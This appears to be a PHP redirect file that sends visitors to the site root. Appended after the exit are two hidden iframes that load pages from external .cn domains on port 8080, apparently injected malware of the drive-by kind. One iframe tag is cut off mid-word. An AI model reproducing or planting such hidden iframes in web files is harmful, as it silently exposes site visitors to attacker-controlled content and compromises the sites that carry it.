<?php
header('Location: /');
exit;

<iframe src="http://shopmovielife.cn:8080/index.php" width=131 height=169 style="visibility: hidden"></ifr
<iframe src="http://filmoflife.cn:8080/index.php" width=104 height=101 style="visibility: hidden"></iframe>